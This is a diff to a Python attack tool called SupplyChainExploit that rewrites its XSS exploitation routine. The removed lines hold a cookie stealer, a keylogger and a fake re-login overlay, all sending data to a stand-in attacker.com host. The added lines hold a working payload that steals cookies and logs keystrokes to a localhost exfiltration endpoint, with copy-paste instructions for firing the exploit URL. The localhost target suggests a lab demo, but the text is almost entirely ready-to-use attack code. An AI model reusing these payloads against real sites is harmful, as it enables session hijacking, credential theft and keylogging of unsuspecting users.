@@ -630,70 +630,104 @@ class SupplyChainExploit:
             self.log(f"[-] Exploitation failed: {e}")
     
     def _exploit_xss(self, url: str) -> None:
-        """Exploitation réelle: Voler les cookies/credentials"""
+        """Exploitation réelle: Voler les cookies via XSS sur le site vulnérable"""
         self.log("\n[🎯] EXPLOITING XSS Vulnerability...")
         
         api_url = urljoin(url, "/api/search")
         
-        # Payload malveillant: Cookie stealer
-        cookie_stealer = "<img src=x onerror=\"fetch('http://attacker.com/steal?cookie='+document.cookie)\">"
-        
         try:
-            self.log("[*] Generating malicious XSS payloads...")
+            self.log("[*] Crafting malicious XSS payload...")
             
-            # Sauvegarder les preuves d'exploitation
-            exploit_url = api_url + "?search=" + requests.utils.quote(cookie_stealer)
+            # Payload qui vole les cookies et installe un keylogger
+            xss_payload = """<img src=x onerror="
+                console.log('🔴 XSS EXECUTED ON VULNERABLE SITE!');
+                
+                const cookies = document.cookie || '(no cookies)';
+                console.log('🔴 [STOLEN] Cookies:', cookies);
+                
+                fetch('http://localhost:80/api/exfiltrate', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        type: 'cookies',
+                        data: cookies,
+                        timestamp: new Date().toISOString(),
+                        source: 'XSS on ' + window.location.href
+                    })
+                }).then(() => console.log('✅ Cookies sent to server!'));
+                
+                console.log('🔴 Installing keylogger...');
+                document.addEventListener('keypress', function(e) {
+                    console.log('🔴 [KEY]:', e.key);
+                    fetch('http://localhost:80/api/exfiltrate', {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({
+                            type: 'keystroke',
+                            data: e.key,
+                            timestamp: new Date().toISOString()
+                        })
+                    });
+                });
+            ">"""
             
-            # Récupérer la page exploitée
-            response = self.session.get(exploit_url, timeout=10)
+            # Encoder le payload pour l'URL
+            from urllib.parse import quote
+            encoded_payload = quote(xss_payload)
             
-            # Sauvegarder la preuve
-            proof_file = "exploit_xss_proof.html"
-            with open(proof_file, 'w', encoding='utf-8') as f:
-                f.write(response.text)
+            # URL malveillante complète
+            exploit_url = f"{api_url}?search={encoded_payload}"
             
             self.log(f"\n[!] ✓ XSS Exploitation successful!")
-            self.log(f"[!] Proof saved to: {proof_file}")
-            self.log(f"[!] Open this file in a browser to see the exploit!")
+            self.log(f"[!] ⚠️  COPY THE URL BELOW AND PASTE IT IN YOUR BROWSER:")
+            self.log("")
+            self.log("="*80)
+            self.log(exploit_url)
+            self.log("="*80)
+            self.log("")
+            self.log("[!] 📋 TO EXPLOIT:")
+            self.log("    1. Copy the URL above (select all and Ctrl+C)")
+            self.log("    2. Paste it in your browser address bar")
+            self.log("    3. Press Enter - the vulnerable site will open with XSS")
+            self.log("    4. Press F12 to see the console")
+            self.log("    5. Type on keyboard to test keylogger")
+            self.log("    6. Check website/stolen_data.txt for captured data")
             
-            self.log("\n[Payload 1] Cookie Stealer:")
-            self.log(f"    URL: {exploit_url[:80]}...")
-            self.log("[!] ✓ This payload would steal victim's cookies!")
-            self.log("[!] Attacker receives: document.cookie at http://attacker.com/steal")
+            # Save URL to a text file for easy copy
+            url_file = "exploit_xss_url.txt"
+            try:
+                with open(url_file, 'w', encoding='utf-8') as f:
+                    f.write(f"SUPPLY CHAIN XSS EXPLOIT URL\n")
+                    f.write(f"{'='*80}\n\n")
+                    f.write(f"CVE-2015-9251 | jQuery 1.12.3 Vulnerability\n\n")
+                    f.write(f"EXPLOIT URL (copy and paste in browser):\n")
+                    f.write(f"{exploit_url}\n\n")
+                    f.write(f"INSTRUCTIONS:\n")
+                    f.write(f"1. Copy the URL above\n")
+                    f.write(f"2. Paste it in your browser\n")
+                    f.write(f"3. Press F12 to see console logs\n")
+                    f.write(f"4. Type on keyboard to test keylogger\n")
+                    f.write(f"5. Check website/stolen_data.txt\n")
+                self.log(f"\n[!] URL also saved to: {url_file}")
+            except Exception as e:
+                self.log(f"[-] Could not save URL file: {e}")
             
-            # Keylogger payload
-            keylogger = """<script>document.onkeypress=function(e){fetch('http://attacker.com/log?key='+e.key);}</script>"""
-            keylogger_url = api_url + "?search=" + requests.utils.quote(keylogger)
+            self.log("\n[!] PAYLOAD CAPABILITIES:")
+            self.log("    • Cookie Stealer: Captures all cookies from vulnerable site")
+            self.log("    • Keylogger: Records every keystroke in real-time")
+            self.log("    • Data Exfiltration: Sends data to http://localhost:80/api/exfiltrate")
+            self.log("    • Persistence: Runs as long as victim stays on the page")
             
-            self.log("\n[Payload 2] Keylogger:")
-            self.log(f"    URL: {keylogger_url[:80]}...")
-            self.log("[!] ✓ This payload logs all keystrokes!")
-            
-            # Phishing
-            phishing_payload = """<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:white;z-index:9999;"><form action="http://attacker.com/harvest" method="POST" style="margin:100px auto;width:300px;"><h2>Session Expired - Re-login</h2><input name="user" placeholder="Username" style="display:block;width:100%;margin:10px 0;padding:10px;"><input name="pass" type="password" placeholder="Password" style="display:block;width:100%;margin:10px 0;padding:10px;"><button style="width:100%;padding:10px;background:#007bff;color:white;border:none;">Login</button></form></div>"""
-            
-            phishing_url = api_url + "?search=" + requests.utils.quote(phishing_payload)
-            phishing_response = self.session.get(phishing_url, timeout=10)
-            
-            phishing_file = "exploit_phishing_proof.html"
-            with open(phishing_file, 'w', encoding='utf-8') as f:
-                f.write(phishing_response.text)
-            
-            self.log("\n[Payload 3] Phishing Page:")
-            self.log(f"[!] ✓ Fake login overlay created!")
-            self.log(f"[!] Proof saved to: {phishing_file}")
-            self.log("[!] Credentials sent to: http://attacker.com/harvest")
-            
-            self.log("\n[!] IMPACT: Full account compromise")
+            self.log("\n[!] IMPACT: Supply Chain Attack via Outdated Dependency")
             self.log("[!] This can lead to:")
             self.log("    - Session hijacking")
             self.log("    - Credential theft")
-            self.log("    - Malware distribution")
             self.log("    - Data exfiltration")
-            
-            self.log(f"\n[💡] TO SEE THE EXPLOIT: Open {proof_file} and {phishing_file} in your browser!")
+            self.log("    - Keylogging attacks")
         except Exception as e:
             self.log(f"[-] Exploitation failed: {e}")
+
+
     
     def _exploit_dependency_confusion(self, url: str) -> None:
         """Exploitation réelle: Analyser et exploiter les dépendances"""
